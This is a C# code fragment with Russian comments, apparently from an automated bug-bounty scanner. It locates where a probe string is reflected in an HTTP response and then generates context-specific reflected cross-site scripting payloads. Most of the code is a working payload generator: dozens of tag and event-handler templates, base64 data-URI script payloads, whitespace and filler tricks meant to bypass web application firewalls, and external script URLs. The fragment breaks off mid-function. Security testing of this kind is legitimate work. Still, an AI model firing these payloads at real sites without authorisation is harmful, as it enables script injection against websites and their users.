//что добавить 
        //NONALPHANUMERIC JAVASCRIPT кодировку пейлоадов



        //Входные данные

        string ProjectDirectory = "";
        string getBountyCampaigns = "";
        string getProfileName = "";
        string requestsID = "";
      
        var listLog = "";
        var list = "";
        var listRequests = "";


        string trafficUrl = "";
        string trafficMethod = "";
        string trafficResultCode = "";
        string trafficContentType = "";
        string trafficRequestHeaders = "";
        string trafficRequestCookies = "";
        string trafficRequestBody = "";
        string finalPayload = "";
        //переменные из Attack_investigator
        string getLine = "";
        string getLineReason = System.Text.RegularExpressions.Regex.Match(getLine, @"(?<=Reason:).*?(?=\|)").Value;
        string getLineParam = System.Text.RegularExpressions.Regex.Match(getLine, @"(?<=Param:).*?(?=\|)").Value;
        string getLineParamValue =
            System.Text.RegularExpressions.Regex.Match(getLine, @"(?<=ParamValue:).*?(?=\|)").Value;
        string strPayload = "";
        string strPayloadType = "";
        string strLocation = "";
        string strReplaced = "";
        string strParam = "";
        string strPayloadTypeToPath = "";


        //testingPayloadXSS = '"<RANDSTR>
        //randomStrXSS = RANDSTR
        string randomStrXSS = "";
        string testingPayloadXSS = "";
        string response = "";

        //Payload
        string payloadTag = "";
        string payloadAttr = "";
        string payloadAttrValue = "";
        string payloadExtra1 = "";
        string payloadExtra2 = "";
        //string payloadExtra3 = "";
        string payloadFiller1 = "";
        string payloadFiller2 = "";
        string payloadFiller3 = "";
        string payloadFiller4 = "";
        string payloadFiller5 = "";
        string payloadFiller6 = "";
        string payloadFiller7 = "";
        string payloadFiller8 = "";
        string payloadJS = "";
        string payloadEventHandler = "";
        string payload = "";



        string[] payloadsArr = new string[] { "[javascript]:[QUOTE][DELIMITER][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][DELIMITER][QUOTE]", "[QUOTE][DELIMITER][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][DELIMITER][QUOTE]", "[javascript]:[QUOTE][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][QUOTE]", "[QUOTE][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][QUOTE]", "[javascript]:[QUOTE][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][QUOTE]", "[QUOTE][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][QUOTE]", "<! [RANDSTR]=\"><script[FILLERCLOSTAG]>[QUOTE][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][QUOTE]</script[FILLERCLOSTAG]>\">", "</ [RANDSTR]=\"><script[FILLERCLOSTAG]>[QUOTE][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][QUOTE]</script[FILLERCLOSTAG]>\">", "<? [RANDSTR]=\"><script[FILLERCLOSTAG]>[QUOTE][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][QUOTE]</script[FILLERCLOSTAG]>\">", "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,[BASE64]\">", "<audio><source[FILLER1][FILLER2][ATTRVALUE]onerror[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<audio[FILLER1][FILLER2]src[FILLER5]onloadstart[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<audio[FILLER1][FILLER2]src[FILLER5]onratechange[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<body[FILLER1][FILLER2][ATTRVALUE]oninput[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]><input autofocus>", "<body[FILLER1][FILLER2][ATTRVALUE]onload[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<body[FILLER1][FILLER2][ATTRVALUE]onpageshow[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<details[FILLER1][FILLER2]open[FILLER5]ontoggle[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<div[FILLER1][FILLER2][ATTRVALUE]onbeforescriptexecute[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]></div>", "<embed[FILLER1][FILLER2]src=\"data:text/html;base64,[BASE64]\"></embed[FILLERCLOSTAG]>", "<embed[FILLER1][FILLER2]src=[QUOTE][javascript]:[FILLER7][JS][FILLER8][QUOTE]></embed[FILLERCLOSTAG]>", "<frameset[FILLER1][FILLER2][ATTRVALUE]onload[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<frameset[FILLER1][FILLER2][ATTRVALUE]onpageshow[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<html[FILLER1][FILLER2][ATTRVALUE]oninput[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]><input autofocus>", "<img[FILLER1][FILLER2]src=x:prompt(eval(alt)) onerror[FILLER6]=eval(src) alt=String.fromCharCode(88,83,83)>", "<img[FILLER1][FILLER2]src[FILLER3]=[FILLER4][RANDSTR][FILLER5]onerror[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<img[FILLER1][FILLER2]srcset=\",,,,,x\"[FILLER5]onerror[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<input[FILLER1][FILLER2][ATTRVALUE]onfocus[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE] autofocus>", "<keygen[FILLER1][FILLER2]autofocus[FILLER5]onfocus[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<marquee[FILLER1][FILLER2][ATTRVALUE]onstart[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<marquee[FILLER1][FILLER2]loop[FILLER3]=[FILLER4]1[FILLER5]width[FILLER3]=[FILLER4]0[FILLER5]onfinish[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<meta/content=\"0;url=data:text/html;base64,[BASE64]\"http-equiv=refresh>", "<object[FILLER1][FILLER2]data=\"data:text/html;base64,[BASE64]\">", "<object[FILLER1][FILLER2]data=\"data:text/html;base64,[BASE64]\"></object[FILLERCLOSTAG]>", "<object[FILLER1][FILLER2]data=[QUOTE][javascript]:[FILLER7][JS][FILLER8][QUOTE]>", "<picture><img[FILLER1][FILLER2]srcset=[RANDSTR] onerror[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]></picture[FILLERCLOSTAG]>", "<picture><source[FILLER1][FILLER2]srcset=[RANDSTR]><img onerror[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]></picture[FILLERCLOSTAG]>", "<script[FILLERCLOSTAG]>onerror=confirm;throw [RANDINT]</script[FILLERCLOSTAG]>", "<script[FILLERCLOSTAG]>throw onerror=confirm,'some string',123,[RANDINT]</script[FILLERCLOSTAG]>", "<script[FILLERCLOSTAG]>{onerror=confirm}throw [RANDINT]</script[FILLERCLOSTAG]>", "<style><img[FILLER1][FILLER2]src=\"</style><img[FILLER1][FILLER2]src[FILLER3]=[FILLER4][RANDSTR][FILLER5]onerror[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]//\">", "<svg[FILLER1][FILLER2][ATTRVALUE]onload[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<svg[FILLER1][FILLER2]xmlns=\"http://www.w3.org/2000/svg\"><script>[QUOTE][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][QUOTE]</script[FILLERCLOSTAG]></svg[FILLERCLOSTAG]>", "<video><source[FILLER1][FILLER2][ATTRVALUE]onerror[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<video[FILLER1][FILLER2][ATTRVALUE]onloadstart[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]><source>", "<video[FILLER1][FILLER2]src[FILLER3]=[FILLER4]_[FILLER5]onloadstart[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "<video[FILLER1][FILLER2]src[FILLER5]onratechange[FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]>", "data:text/html,<script[FILLERCLOSTAG]>[QUOTE][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][QUOTE]</script[FILLERCLOSTAG]>" };

        //Логика https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228, https://github.com/s0md3v/AwesomeXSS

        //Варианты в каком контексте могут рефлектед быть:
        //html (tag outside), tag, script, comment, json (только если content-type: html)

        //Разные варианты пейлоадов в зависимости от контекста
        //Tag-Handler (https://brutelogic.com.br/webgun/) extra1 <tag Filler1 extra2 Filler2 handler Filler3 = Filler4 function Filler5> extra3
        //extra2 - это в основном "attribute = value"
        //https://html5sec.org/#html
        //[extra1]<name[filler1][filler2]attr[filler3]=[filler4]value[filler5]handler[filler6]=[filler7]js[filler8]>[extra2]
        //[0]<name[1][2]attr[3]=[4]value[5]handler[6]=[7]js[8]>[9]
        //[0] - extra1
        //[1],[3],[6] - %09, %0A, %0C, %0D, %20, /, +
        //[2] - /
        //[4],[5] -  %09, %0A, %0C, %0D, %20, +
        //[7],[8] - %09, %0A, %0B, %0C, %0D, %20, /, +
        //[9] - extra2

        //<a href="[1]java[2]script[3]:alert(1)">xxx</a[4]>
        //[1] - %09, %0A, %0D, %20
        //[2],[3] - %09, %0A, %0D
        //[4] - %09, %0A, %0C, %0D, %20, /, +, randomString, whitespace+characters </script ~[~2]dfg@(/)[]>


        //Количество рефлектед в респонсе
        int countReflections = Regex.Matches(response, randomStrXSS).Count;

        if (countReflections > 0)
        {
            //респонс в одну строку переводим, т.к. могут быть разбитые ссылки
            response = Macros.TextProcessing.Replace(response, @"\r\n", "", "Regex", "All");
            response = Macros.TextProcessing.Replace(response, @"\n", "", "Regex", "All");

            //1.Проверяем есть ли в респонсе randomStrXSS
            //if (Regex.IsMatch(response, @randomStrXSS))
            //{
            //2. проверяем кодирован ли запрос или нет. Нужно чтобы хотя бы <> или " некодированные были
            //' - &#39;(dec) или &#x27;(hex) или &apos;
            //" - &quot; &#34;
            //< - &lt; &#60;
            //> - &gt; &#62;

            //3. Берем все, если некодированное "<[^<]*<TEST>[^>]*>". Если кодированное, то "<[^<]*TEST[^>]*>". Берем и то, и другое.
            var listXSS = Regex
                .Matches(response, @"<[^<]*<" + randomStrXSS + @">[^>]*>" + @"|<[^<]*" + randomStrXSS + @"[^>]*>")
                .Cast<Match>().Select(m => m.Value).ToArray();


            for (int i = 0; i < listXSS.Length; i++)
            {
                var getItem = listXSS[i];

                //нужно записать все рефлекшены в лог

                listRequests.Add("XSSReflection:" + getItem + "|PayloadType:" + strPayloadType + "_" + strLocation + "|Payload:" + strPayload);


                //3.1 если ничего не кодировано
                if (Regex.IsMatch(getItem, @"'""<" + randomStrXSS + @">"))
                {
                    //<style>, <title>, <noembed>, <template>, <noscript>, <textarea>
                    //These tags must be closed to execute payload. The only difference between executable and non - exe is the test of { closing tag} component.
                    //Сначала определяем location рефлектед. Outside TAG, Inside TAG или SCRIPT

                    //3.1.1 SCRIPT. (Web Application Obfuscation.pdf)
                    if (Regex.IsMatch(getItem,
                            @"(<script>|<script\ type=""text/javascript"">).*?" + randomStrXSS +
                            @".*?</script>") || Regex.IsMatch(getItem,
                            @"<script.*?" + randomStrXSS + @".*?(>|</script>)"))
                    {
                        string randInt = Encoder.RandomNumber(5);
                        //3.1.1.1 SCRIPT. Variable
                        //https://public-firing-range.appspot.com/reflected/index.html
                        //var foo = %q, var foo = "%q",  var foo = '%q', var foo = \%q\, var foo = / %q /, var foo = /* "%q" */
                        //если в переменной
                        if (Regex.IsMatch(getItem,
                            @"(?<=const|let|var)\s+(\w+?).*" + randomStrXSS + @".*(|(?=;))")) //(?<=const|let|var)\s+(\w+?).*test.*(|(?=;)) возьмет от названия переменной до ; или
                        {
                            //\%q\, /%q/, /* %q */
                            if (Regex.IsMatch(getItem, randomStrXSS + @"/|\\") ||
                                Regex.IsMatch(getItem, @"\/\*.*" + randomStrXSS + @".*\*\/"))
                            {
                                string scheme =
                                    "</script[FILLERCLOSTAG1]><script[FILLERCLOSTAG2]>[SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2]</script[FILLERCLOSTAG3]>";
                                payload = Macros.TextProcessing.Replace(scheme, "[FILLERCLOSTAG1]", Encoder.XSSfillerClosTag(5), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLERCLOSTAG2]", Encoder.XSSfillerClosTag(5), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLERCLOSTAG3]", Encoder.XSSfillerClosTag(3), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER1]", Encoder.XSSscriptFiller1(5), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER2]", Encoder.XSSscriptFiller2(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[XSSJSINSCRIPT]", Encoder.XSSjsInScript(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[RANDINT]", randInt, "Text", "First");
                                list.Add(payload + "|ReflectedXSS_" + randInt);
                            }

                            //"%q", '%q' https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228
                            //"%q" - https://public-firing-range.appspot.com/reflected/parameter/js_quoted_string?q=%22^~~void[567].every(prompt)*%22
                            //'%q' - https://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string?q=%27^+++[567].every(prompt)^~void%27
                            else if (Regex.IsMatch(getItem, randomStrXSS + @"'|"""))
                            {
                                string scheme =
                                    "[DELIMITER][SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2][DELIMITER]";
                                payload = Macros.TextProcessing.Replace(scheme, "[SCRIPTFILLER1]",
                                    Encoder.XSSscriptFiller1(5), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER2]",
                                    Encoder.XSSscriptFiller2(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[DELIMITER]",
                                    Encoder.XSSdelimiter(), "Text", "All");
                                payload = Macros.TextProcessing.Replace(payload, "[XSSJSINSCRIPT]",
                                    Encoder.XSSjsInScript(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[RANDINT]",
                                    randInt, "Text", "First");
                                if (Regex.IsMatch(getItem, randomStrXSS + @""""))
                                {
                                    list.Add("\"" + payload + "\"" + "|ReflectedXSS_" + randInt);
                                }
                                else if (Regex.IsMatch(getItem, randomStrXSS + @"'"))
                                {
                                    list.Add("'" + payload + "'" + "|ReflectedXSS_" + randInt);
                                }

                            }
                            //%q
                            else
                            {
                                string scheme =
                                    "[SCRIPTFILLER1][XSSJSINSCRIPT][SCRIPTFILLER2]";
                                payload = Macros.TextProcessing.Replace(scheme, "[SCRIPTFILLER1]",
                                    Encoder.XSSscriptFiller1(5), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER2]",
                                    Encoder.XSSscriptFiller2(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[XSSJSINSCRIPT]",
                                    Encoder.XSSjsInScript(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[RANDINT]",
                                    randInt, "Text", "First");
                                list.Add(payload + "|ReflectedXSS_" + randInt);
                            }
                        }

                        //3.1.1.3 SCRIPT. Function
                        //   eval(%q) https://public-firing-range.appspot.com/reflected/parameter/js_eval?q=~!--+++[567].every(prompt)%0C
                        else if (Regex.IsMatch(getItem, @"\(.*" + randomStrXSS + @".*\)"))
                        {
                            string scheme =
                                "[SCRIPTFILLERFUNCTION1][XSSJSINSCRIPT][SCRIPTFILLERFUNCTION2]";
                            payload = Macros.TextProcessing.Replace(scheme,
                                "[SCRIPTFILLERFUNCTION1]", Encoder.XSSscriptFillerFunction1(5), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload,
                                "[SCRIPTFILLERFUNCTION2]", Encoder.XSSscriptFillerFunction2(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[XSSJSINSCRIPT]",
                                Encoder.XSSjsInScript(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[RANDINT]", randInt, "Text", "First");
                            list.Add(payload + "|ReflectedXSS_" + randInt);


                        }

                        //3.1.1.4 SCRIPT. Block


                        //3.1.1.5 SCRIPT. src attribute
                        if (Regex.IsMatch(getItem,
                            @"(href|src|srcdoc|action|cite|srcset)=.*?" + randomStrXSS))
                        {
                            for (int ii = 0; ii < 25; ii++)
                            {
                                payload = Macros.TextProcessing.Replace(Encoder.XSSjs(), "[RANDINT]",
                                    randInt, "Text", "First");
                                list.Add(payload + "|ReflectedXSS_" + randInt);
                            }

                            list.Add("http://xss.rocks/scriptlet.html" + "|ReflectedXSS_XSS");
                            list.Add("http://xss.rocks/xss.css" + "|ReflectedXSS_XSS");
                            list.Add("http://xss.rocks/xss.js" + "|ReflectedXSS_XSS");
                        }
                    }

                    //3.1.2 Outside TAG
                    else if (Regex.IsMatch(getItem, @"(?<=>)*" + randomStrXSS + @".*?(?=</)")) //<span>You entered $TEST</span>
                    {

                        //3.1.2.1 <style>, <title>, <noembed>, <template>, <noscript>, <textarea> (хз про <pre> и <xmp> теги)закрыты должны быть + 
                        //</tag>, </tAg/x>, </tag{space}>, </tag//>, </tag%0a>, </tag%0d>, </tag%09>
                        //может быть внутри так снаружи тега <textarea attribute='TEST'> vs <textarea>TEST</textarea>
                        //закрывающего не будет, если внутри тега <textarea attribute='TEST'></textarea> (только <textarea attribute='TEST'>)
                        if (Regex.IsMatch(getItem, @"<style>.*?" + randomStrXSS + @".*</style>"))
                        {
                            payloadExtra1 = "</style" + Encoder.XSSfillerClosTag(3) + ">";
                        }
                        else if (Regex.IsMatch(getItem, @"<title>.*?" + randomStrXSS + @".*</title>"))
                        {
                            payloadExtra1 = "</title" + Encoder.XSSfillerClosTag(3) + ">";
                        }
                        else if (Regex.IsMatch(getItem, @"<noembed>.*?" + randomStrXSS + @".*</noembed>"))
                        {
                            payloadExtra1 = "</noembed" + Encoder.XSSfillerClosTag(3) + ">";
                        }
                        else if (Regex.IsMatch(getItem, @"<template>.*?" + randomStrXSS + @".*</template>"))
                        {
                            payloadExtra1 = "</template" + Encoder.XSSfillerClosTag(3) + ">";
                        }
                        else if (Regex.IsMatch(getItem, @"<noscript>.*?" + randomStrXSS + @".*</noscript>"))
                        {
                            payloadExtra1 = "</noscript" + Encoder.XSSfillerClosTag(3) + ">";
                        }
                        else if (Regex.IsMatch(getItem, @"<textarea>.*?" + randomStrXSS + @".*</textarea>"))
                        {
                            payloadExtra1 = "</textarea" + Encoder.XSSfillerClosTag(3) + ">";
                        }

                        else
                        {
                            payloadExtra1 = "";
                        }

                        string randInt = Encoder.RandomNumber(5);
                        foreach (string y in payloadsArr)
                        {
                            payload = Macros.TextProcessing.Replace(y, "[FILLER1]",
                                Encoder.XSSfiller1(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLER2]",
                                Encoder.XSSfiller2(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLER3]",
                                Encoder.XSSfiller3(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLER4]",
                                Encoder.XSSfiller4(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLER5]",
                                Encoder.XSSfiller5(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLER6]",
                                Encoder.XSSfiller6(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLER7]",
                                Encoder.XSSfiller7(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLER8]",
                                Encoder.XSSfiller8(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[ATTRVALUE]",
                                Encoder.XSSAttrAndValue(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[JS]",
                                Encoder.XSSjs(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[RANDSTR]",
                                Encoder.RandomString(3), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER1]",
                                Encoder.XSSscriptFiller1(5), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER2]",
                                Encoder.XSSscriptFiller2(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[XSSJSINSCRIPT]",
                                Encoder.XSSjsInScript(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[DELIMITER]",
                                Encoder.XSSdelimiter(), "Text", "All");
                            payload = Macros.TextProcessing.Replace(payload, "[RANDINT]", randInt, "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLERCLOSTAG]",
                                Encoder.XSSfillerClosTag(5), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[javascript]",
                                Encoder.XSSjavascript(), "Text", "First");
                            if (payload.Contains("[BASE64]"))
                            {
                                string xssBase64 = Macros.TextProcessing.Spintax(
                                    "{<script>onerror=alert;throw [RANDINT]</script>|<embed src=\"javascript:confirm([RANDINT])\"></embed>|<script>[JS]</script>}");
                                xssBase64 = Macros.TextProcessing.Replace(xssBase64, "[RANDINT]",
                                    randInt, "Text", "First");
                                xssBase64 = Macros.TextProcessing.Replace(xssBase64, "[JS]",
                                    Encoder.XSSjs(), "Text", "First");
                                var xssbs64 = System.Text.Encoding.UTF8.GetBytes(xssBase64);
                                var xssBase64Final = System.Convert.ToBase64String(xssbs64);
                                payload = Macros.TextProcessing.Replace(payload, "[BASE64]",
                                    xssBase64Final, "Text", "First");
                            }

                            if (payload.Contains("'"))
                            {
                                payload = Macros.TextProcessing.Replace(payload, "[QUOTE]",
                                    Macros.TextProcessing.Spintax("{\"|\"||||}"), "Text", "All");
                            }
                            else
                                payload = Macros.TextProcessing.Replace(payload, "[QUOTE]",
                                    Macros.TextProcessing.Spintax("{\"|\"|'|'||||}"), "Text", "All");

                            //Добавляем в Payloads
                            list.Add(payloadExtra1 + payload + "|ReflectedXSS_" + randInt);
                        }


                    }

                    //3.1.3 Inside Tag
                    else
                    {
                        //проверяем нет ли в начале non-exe тега
                        if (!Regex.IsMatch(getItem, @"<style.*?" + randomStrXSS) &&
                            !Regex.IsMatch(getItem, @"<title.*?" + randomStrXSS) &&
                           !Regex.IsMatch(getItem, @"<noembed.*?" + randomStrXSS) &&
                            !Regex.IsMatch(getItem, @"<template.*?" + randomStrXSS) &&
                            !Regex.IsMatch(getItem, @"<noscript.*?" + randomStrXSS) &&
                            !Regex.IsMatch(getItem, @"<textarea.*?" + randomStrXSS))
                        {
                            //3.1.3.1 Inside Tag. Url Attribute Value
                            if (Regex.IsMatch(getItem,
                                @"(href|src|srcdoc|action|cite|srcset)=.*?" + randomStrXSS))
                            {
                                string randInt = Encoder.RandomNumber(5);
                                for (int ix = 0; ix < 20; ix++)
                                {
                                    payload = Macros.TextProcessing.Replace(Encoder.XSSjs(),
                                        "[RANDINT]", randInt, "Text", "First");
                                    list.Add(payload + "|ReflectedXSS_" + randInt);
                                }

                                list.Add("http://xss.rocks/scriptlet.html" + "|ReflectedXSS_XSS");
                                list.Add("http://xss.rocks/xss.css" + "|ReflectedXSS_XSS");
                                list.Add("http://xss.rocks/xss.js" + "|ReflectedXSS_XSS");
                            }

                            //3.1.3.2 Inside Tag. Attribute Name
                            else if (Regex.IsMatch(getItem, randomStrXSS + @"[^\s]*=")
                            ) //TEST[^\s]*= без пробелов
                            {

                            }
                            //3.1.3.3 Inside Tag. Tag Name
                            else if (Regex.IsMatch(getItem, @"<[^\s]*" + randomStrXSS)
                            ) //<[^\s]*TEST без пробелов
                            {

                            }
                            //3.1.3.4 Inside Tag. Attribute Value
                            else
                            {
                                string randInt = Encoder.RandomNumber(5);
                                for (int iq = 0; iq < 20; iq++)
                                {
                                    //"или'[FILLER5][EVENT][FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]
                                    string scheme =
                                        "[FILLER5][EVENT][FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]";
                                    payload = Macros.TextProcessing.Replace(scheme, "[FILLER5]",
                                        Encoder.XSSfiller5(), "Text", "First");
                                    payload = Macros.TextProcessing.Replace(payload, "[FILLER6]",
                                        Encoder.XSSfiller6(), "Text", "First");
                                    payload = Macros.TextProcessing.Replace(payload, "[FILLER7]",
                                        Encoder.XSSfiller7(), "Text", "First");
                                    payload = Macros.TextProcessing.Replace(payload, "[FILLER8]",
                                        Encoder.XSSfiller8(), "Text", "First");
                                    payload = Macros.TextProcessing.Replace(payload, "[JS]",
                                        Encoder.XSSjs(), "Text", "First");
                                    payload = Macros.TextProcessing.Replace(payload, "[RANDINT]",
                                        randInt, "Text", "First");
                                    payload = Macros.TextProcessing.Replace(payload, "[EVENT]",
                                        Macros.TextProcessing.Spintax(
                                            "{onload|onload|onload|onload|onclick|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|onmouseover|onmouseup|onclick|onauxclick|ondblclick|ondrag|ondragend|ondragenter|ondragexit|ondragleave|ondragover|ondragstart}"), "Text", "First");
                                    if (Regex.IsMatch(getItem, @"="".*" + randomStrXSS))
                                    {
                                        list.Add("\"" + payload + "|ReflectedXSS_" + randInt);
                                    }
                                    else if (Regex.IsMatch(getItem, @"='.*" + randomStrXSS))
                                    {
                                        list.Add("'" + payload + "|ReflectedXSS_" + randInt);
                                    }
                                    else
                                    {
                                        list.Add(payload + "|ReflectedXSS_" + randInt);
                                    }
                                }
                            }

                            //3.1.3.5 Inside Tag. добавляем станд список
                            string randInt1 = Encoder.RandomNumber(5);
                            foreach (string iy in payloadsArr)
                            {
                                payload = Macros.TextProcessing.Replace(iy, "[FILLER1]",
                                    Encoder.XSSfiller1(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER2]",
                                    Encoder.XSSfiller2(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER3]",
                                    Encoder.XSSfiller3(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER4]",
                                    Encoder.XSSfiller4(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER5]",
                                    Encoder.XSSfiller5(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER6]",
                                    Encoder.XSSfiller6(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER7]",
                                    Encoder.XSSfiller7(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER8]",
                                    Encoder.XSSfiller8(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[ATTRVALUE]",
                                    Encoder.XSSAttrAndValue(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[JS]",
                                    Encoder.XSSjs(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[RANDSTR]",
                                    Encoder.RandomString(3), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER1]",
                                    Encoder.XSSscriptFiller1(5), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER2]",
                                    Encoder.XSSscriptFiller2(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[XSSJSINSCRIPT]",
                                    Encoder.XSSjsInScript(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[DELIMITER]",
                                    Encoder.XSSdelimiter(), "Text", "All");
                                payload = Macros.TextProcessing.Replace(payload, "[RANDINT]",
                                    randInt1, "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLERCLOSTAG]",
                                    Encoder.XSSfillerClosTag(3), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[javascript]",
                                    Encoder.XSSjavascript(), "Text", "First");
                                if (payload.Contains("[BASE64]"))
                                {
                                    string xssBase64 = Macros.TextProcessing.Spintax(
                                        "{<script>onerror=alert;throw [RANDINT]</script>|<embed src=\"javascript:confirm([RANDINT])\"></embed>|<script>[JS]</script>}");
                                    xssBase64 = Macros.TextProcessing.Replace(xssBase64, "[RANDINT]",
                                        randInt1, "Text", "First");
                                    xssBase64 = Macros.TextProcessing.Replace(xssBase64, "[JS]",
                                        Encoder.XSSjs(), "Text", "First");
                                    var xssbs64 = System.Text.Encoding.UTF8.GetBytes(xssBase64);
                                    var xssBase64Final = System.Convert.ToBase64String(xssbs64);
                                    payload = Macros.TextProcessing.Replace(payload, "[BASE64]",
                                        xssBase64Final, "Text", "First");
                                }

                                if (payload.Contains("'"))
                                {
                                    payload = Macros.TextProcessing.Replace(payload, "[QUOTE]",
                                        Macros.TextProcessing.Spintax("{\"|\"||||}"), "Text", "All");
                                }
                                else
                                    payload = Macros.TextProcessing.Replace(payload, "[QUOTE]",
                                        Macros.TextProcessing.Spintax("{\"|\"|'|'||||}"), "Text", "All");

                                //Добавляем в Payloads
                                if (Regex.IsMatch(getItem, @"="".*" + randomStrXSS))
                                {
                                    list.Add("\">" + payload + "|ReflectedXSS_" + randInt1);
                                }
                                else if (Regex.IsMatch(getItem, @"='.*" + randomStrXSS))
                                {
                                    list.Add("'>" + payload + "|ReflectedXSS_" + randInt1);
                                }
                                else
                                {
                                    list.Add(">" + payload + "|ReflectedXSS_" + randInt1);
                                }
                            }
                        }

                        //если внутри тегов <style>, <title>, <noembed>, <template>, <noscript>, <textarea> (<textarea src='TEST'>)
                        else
                        {
                            //<style attribute='TEST'>
                            if (Regex.IsMatch(getItem, @"<style.*?" + randomStrXSS))
                            {
                                if (Regex.IsMatch(getItem, @"="".*" + randomStrXSS))
                                {
                                    payloadExtra1 = "\"></style" + Encoder.XSSfillerClosTag(3) + ">";
                                }
